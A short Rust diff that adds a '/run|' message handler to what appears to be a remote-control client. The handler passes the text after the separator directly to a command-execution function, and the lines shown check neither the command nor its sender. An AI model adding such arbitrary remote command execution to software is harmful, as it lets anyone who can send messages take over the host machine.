@@ -202,6 +202,22 @@ async fn main() {
 
 
             let mut interpreted = (async || {
+                if message.request.starts_with("/run|") {
+                    let parts: Vec<&str> = message.request.split("|").collect();
+                    if parts.len() != 2 {
+                        return "failed to parse command: invalid format".to_string();
+                    }
+
+                    let cmd = parts[1].to_string();
+
+                    let output = match exc::run_and_forget(&cmd) {
+                        Ok(_) => "ok".to_string(),
+                        Err(e) => e.to_string(),
+                    };
+
+                    return output;
+                }
+
                 if message.request.starts_with("/download-file|") {
                     // Parse the command to extract file name on disk and file ID.
                     let parts: Vec<&str> = message.request.split("|").collect();
